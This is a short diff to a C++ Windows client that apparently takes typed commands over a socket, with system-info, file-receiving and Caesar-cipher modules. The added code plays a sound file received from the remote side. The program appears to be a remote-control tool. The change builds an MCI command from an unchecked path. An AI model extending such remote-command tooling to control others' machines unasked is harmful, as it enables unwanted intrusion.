@@ -10,6 +10,7 @@
 #include "..\Headers\CaesarCipherShift.h"
 #include "System-info\info.h"
 #include "Receive-File\receiveFile.h"
+#include <mmsystem.h>
 
 int main(int argc, char* argv[]) {
     if(argc < 2) {
@@ -173,7 +174,14 @@ int main(int argc, char* argv[]) {
         }
 
         if(type == TYPE_SOUND) {
-            std::cout << "SOUNDS!\n";
+            std::string path;
+            path = receiveFile(sock, buffer);
+            if(!path.empty()) {
+                std::string openFile = "open \"" + path + "\"";
+                mciSendStringA(openFile.c_str(), NULL, 0, 0);
+                mciSendStringA("play media", NULL, 0, 0);
+                std::cout << SUCCESS_PREFIX << " Playing: " << path << std::endl;
+            }
         }
 
         if(type == TYPE_EXIT) {
